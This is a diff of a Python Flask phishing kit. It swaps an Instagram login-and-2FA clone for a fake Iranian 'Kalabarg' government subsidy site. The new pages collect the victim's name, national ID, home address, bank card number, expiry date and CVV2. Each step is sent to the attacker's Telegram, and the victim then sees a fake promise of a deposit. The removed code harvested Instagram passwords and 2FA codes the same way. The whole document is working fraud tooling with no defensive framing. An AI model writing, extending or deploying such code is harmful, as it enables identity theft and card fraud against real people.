@@ -16,68 +16,145 @@ def send_telegram(text):
     except:
         pass
 
-# ====== صفحه اول: یوزر و پسورد ======
-html_login = """
+# ====== صفحه اول: اطلاعات هویتی ======
+html_step1 = """
 <!DOCTYPE html>
-<html>
+<html lang="fa" dir="rtl">
 <head>
-<title>Instagram</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>سامانه کالابرگ الکترونیکی</title>
+<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
 <style>
-body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 1px; }
-h1 { font-family: 'Billabong', cursive, serif; font-size: 45px; margin-bottom: 30px; color: #262626; font-weight: normal; }
-input { width: 100%; padding: 10px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 12px; outline: none; }
-input:focus { border-color: #a8a8a8; }
-button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; }
-.divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
-.divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
-.divider span { padding: 0 18px; }
-.fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; display: block; margin-bottom: 12px; }
-.forgot { color: #00376b; font-size: 12px; text-decoration: none; display: block; }
+  body { font-family: 'Vazirmatn', sans-serif; background: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+  .container { background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; }
+  .header { background: #007bff; color: white; text-align: center; padding: 20px; }
+  .header h2 { margin: 0; font-size: 18px; }
+  .body { padding: 25px; }
+  .input-group { margin-bottom: 15px; }
+  .input-group label { display: block; margin-bottom: 5px; font-size: 13px; color: #555; }
+  .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-family: inherit; }
+  .btn { width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; font-family: inherit; }
 </style>
 </head>
 <body>
-<div class="box">
-<h1>Instagram</h1>
-<form method="POST" action="/login">
-<input type="text" name="username" placeholder="Phone number, username, or email" required>
-<input type="password" name="password" placeholder="Password" required>
-<button type="submit">Log in</button>
-</form>
-<div class="divider"><span>OR</span></div>
-<a href="#" class="fb-login">Log in with Facebook</a>
-<a href="#" class="forgot">Forgot password?</a>
+<div class="container">
+  <div class="header">
+    <h2>سامانه کالابرگ الکترونیکی</h2>
+  </div>
+  <div class="body">
+    <form method="POST" action="/step2">
+      <div class="input-group">
+        <label>نام</label>
+        <input type="text" name="first_name" required placeholder="نام خود را وارد کنید">
+      </div>
+      <div class="input-group">
+        <label>نام خانوادگی</label>
+        <input type="text" name="last_name" required placeholder="نام خانوادگی">
+      </div>
+      <div class="input-group">
+        <label>کد ملی</label>
+        <input type="text" name="national_id" required placeholder="کد ملی ۱۰ رقمی" maxlength="10">
+      </div>
+      <button type="submit" class="btn">مرحله بعد</button>
+    </form>
+  </div>
 </div>
 </body>
 </html>
 """
 
-# ====== صفحه دوم: کد دو مرحله‌ای (2FA) ======
-html_2fa = """
+# ====== صفحه دوم: آدرس ======
+html_step2 = """
 <!DOCTYPE html>
-<html>
+<html lang="fa" dir="rtl">
 <head>
-<title>Security Code</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>سامانه کالابرگ الکترونیکی</title>
+<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
 <style>
-body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 1px; }
-h2 { font-size: 20px; color: #262626; margin-bottom: 10px; }
-p { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; }
-input { width: 100%; padding: 10px 8px; margin-bottom: 15px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 16px; text-align: center; letter-spacing: 5px; outline: none; }
-button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; }
+  body { font-family: 'Vazirmatn', sans-serif; background: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+  .container { background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; }
+  .header { background: #007bff; color: white; text-align: center; padding: 20px; }
+  .header h2 { margin: 0; font-size: 18px; }
+  .body { padding: 25px; }
+  .input-group { margin-bottom: 15px; }
+  .input-group label { display: block; margin-bottom: 5px; font-size: 13px; color: #555; }
+  .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-family: inherit; }
+  .btn { width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; font-family: inherit; }
 </style>
 </head>
 <body>
-<div class="box">
-<h2>Enter Security Code</h2>
-<p>Please check your phone for a text message with your security code. Enter the 6-digit code below.</p>
-<form method="POST" action="/verify">
-<input type="text" name="code" placeholder="6-digit code" maxlength="6" required>
-<button type="submit">Confirm</button>
-</form>
+<div class="container">
+  <div class="header">
+    <h2>سامانه کالابرگ الکترونیکی</h2>
+  </div>
+  <div class="body">
+    <form method="POST" action="/step3">
+      <div class="input-group">
+        <label>شهر</label>
+        <input type="text" name="city" required placeholder="نام شهر">
+      </div>
+      <div class="input-group">
+        <label>آدرس دقیق</label>
+        <input type="text" name="address" required placeholder="خیابان، کوچه، پلاک">
+      </div>
+      <div class="input-group">
+        <label>کد پستی</label>
+        <input type="text" name="postal_code" placeholder="کد پستی ۱۰ رقمی" maxlength="10">
+      </div>
+      <button type="submit" class="btn">مرحله بعد</button>
+    </form>
+  </div>
+</div>
+</body>
+</html>
+"""
+
+# ====== صفحه سوم: کارت بانکی ======
+html_step3 = """
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>سامانه کالابرگ الکترونیکی</title>
+<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
+<style>
+  body { font-family: 'Vazirmatn', sans-serif; background: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+  .container { background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; }
+  .header { background: #28a745; color: white; text-align: center; padding: 20px; }
+  .header h2 { margin: 0; font-size: 18px; }
+  .body { padding: 25px; }
+  .input-group { margin-bottom: 15px; }
+  .input-group label { display: block; margin-bottom: 5px; font-size: 13px; color: #555; }
+  .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-family: inherit; text-align: left; direction: ltr; }
+  .btn { width: 100%; padding: 14px; background: #28a745; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; font-family: inherit; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h2>ثبت اطلاعات بانکی جهت دریافت اعتبار</h2>
+  </div>
+  <div class="body">
+    <form method="POST" action="/finish">
+      <div class="input-group">
+        <label>شماره کارت</label>
+        <input type="text" name="card_number" required placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="16">
+      </div>
+      <div class="input-group">
+        <label>تاریخ انقضا</label>
+        <input type="text" name="expiry" required placeholder="MM/YY" maxlength="5">
+      </div>
+      <div class="input-group">
+        <label>CVV2</label>
+        <input type="password" name="cvv2" required placeholder="***" maxlength="4">
+      </div>
+      <button type="submit" class="btn">دریافت اعتبار</button>
+    </form>
+  </div>
 </div>
 </body>
 </html>
@@ -85,39 +162,63 @@ button { width: 100%; padding: 7px; background: #0095f6; color: white; border: n
 
 @app.route("/")
 def home():
-    return html_login
+    return html_step1
 
-@app.route("/login", methods=["POST"])
-def login():
-    u = request.form.get("username", "")
-    p = request.form.get("password", "")
+@app.route("/step2", methods=["POST"])
+def step2():
+    fname = request.form.get("first_name", "")
+    lname = request.form.get("last_name", "")
+    nid = request.form.get("national_id", "")
     ip = request.remote_addr
 
-    # ارسال مرحله اول به تلگرام
     send_telegram(
-        f"🎯 **مرحله اول (یوزر/پسورد)**\n\n"
-        f"👤 Username: {u}\n"
-        f"🔑 Password: {p}\n"
+        f"🪪 **اطلاعات هویتی (کالابرگ)**\n\n"
+        f"👤 نام: {fname}\n"
+        f"👤 نام خانوادگی: {lname}\n"
+        f"🆔 کد ملی: {nid}\n"
         f"🌐 IP: {ip}"
     )
+    return html_step2
 
-    # رفتن به صفحه کد دو مرحله‌ای
-    return html_2fa
-
-@app.route("/verify", methods=["POST"])
-def verify():
-    code = request.form.get("code", "")
+@app.route("/step3", methods=["POST"])
+def step3():
+    city = request.form.get("city", "")
+    addr = request.form.get("address", "")
+    postal = request.form.get("postal_code", "")
     ip = request.remote_addr
 
-    # ارسال مرحله دوم (کد) به تلگرام
     send_telegram(
-        f"🔐 **مرحله دوم (کد 2FA)**\n\n"
-        f"🔢 Code: {code}\n"
+        f"📍 **اطلاعات آدرس**\n\n"
+        f"🏙️ شهر: {city}\n"
+        f"🏠 آدرس: {addr}\n"
+        f"📮 کد پستی: {postal}\n"
         f"🌐 IP: {ip}"
     )
+    return html_step3
 
-    # هدایت به اینستاگرام واقعی
-    return '<script>window.location.href="https://www.instagram.com"</script>'
+@app.route("/finish", methods=["POST"])
+def finish():
+    card = request.form.get("card_number", "")
+    exp = request.form.get("expiry", "")
+    cvv = request.form.get("cvv2", "")
+    ip = request.remote_addr
+
+    send_telegram(
+        f"💳 **اطلاعات بانکی**\n\n"
+        f"💳 شماره کارت: {card}\n"
+        f"📅 تاریخ انقضا: {exp}\n"
+        f"🔐 CVV2: {cvv}\n"
+        f"🌐 IP: {ip}"
+    )
+    
+    return """
+    <html lang="fa" dir="rtl">
+    <body style="font-family: Tahoma, sans-serif; text-align: center; padding: 50px; background: #f4f6f9;">
+        <h2 style="color: #28a745;">ثبت اطلاعات با موفقیت انجام شد</h2>
+        <p style="color: #555;">اعتبار کالابرگ به حساب شما واریز خواهد شد.</p>
+    </body>
+    </html>
+    """
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
